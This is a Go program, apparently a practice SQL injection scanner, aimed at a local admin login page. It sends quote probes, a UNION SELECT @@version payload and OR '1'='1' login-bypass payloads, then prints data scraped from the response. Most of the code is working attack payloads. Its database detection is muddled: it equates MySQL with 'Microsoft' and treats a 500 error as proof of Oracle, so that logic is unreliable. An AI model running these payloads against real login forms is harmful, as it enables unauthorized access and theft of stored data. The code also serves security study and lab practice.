package main

import (
		"fmt"
		"io/ioutil"
		"log"
		"net/http"
		"net/url"
		"strings"
		"regexp"
)

type Database struct {
	banner string;
	collected_data []string;
}

func get_response(data url.Values) (int, string) {
	resp, err := http.PostForm("http://localhost:3000/admin/panel_login.php", data);
	if (err != nil) {
		log.Fatal(err);
	}

	body, err := ioutil.ReadAll(resp.Body);
	if (err != nil) {
		log.Fatal(err);
	}

	return resp.StatusCode, string(body);
}

func check_sqli() bool {
	data := url.Values {
		"username":		{"''"},
		"password":		{"'"},
	};

	var good bool = false;

	var code int;
	var body string;
	code, body = get_response(data);

	if (code == 500) {
		good = true;
	}

	data = url.Values {
		"username":		{"''"},
		"password":		{"''"},
	};

	code, body = get_response(data);
	if (code == 200) {
		good = true;
	}

	if (good && (body != "")) {
		return true;
	}
	return false;
}

func get_version() string {
	data := url.Values {
		"username":		{"admin"},
		"password":		{"test' UNION SELECT 1,2,@@version;-- "},
	};
	code, body := get_response(data);
	if (code == 500 || (strings.Contains(body, "Fatal"))) {
		return "Oracle";
	}
	return "Microsoft";
}
func oracle_enumeration() {
	fmt.Println("Oracle Enumeration Section");
}

func mysql_enumeration() {
	data := url.Values {
		"username":		{"admin'OR'1'-'1"},
		"password":		{"test'OR'1'='1'-- "},
	};
	code, body := get_response(data);
	if (code == 200 && !(strings.Contains(body, "Fatal"))) {
		re := regexp.MustCompile(`JSONSTART\[.*?\]JSONEND`);
		final := re.FindString(body);
		fmt.Println(final);
	}
}

func main() {
	var vuln bool = check_sqli();
	fmt.Println("\n*************** BEGINNING SQLinjection SCAN ****************\n");
	if (vuln == true) {
		fmt.Println("************APPLICATION IS VULNERABLE TO SQLi, VERSION TESTING***********\n");
		var _type string = get_version();
		if (_type == "Microsoft") {
			fmt.Println("************MICROSOFT MYSQL DATABASE IN USE**************\n");
			mysql_enumeration()
		} else if (_type == "Oracle") {
			fmt.Println("************ORACLE SQL DATABASE IN USE***************\n");
			oracle_enumeration()
		} else {
			fmt.Println("************UNABLE TO DETERMINE DATABASE TYPE**************\n");
		}
	}
}
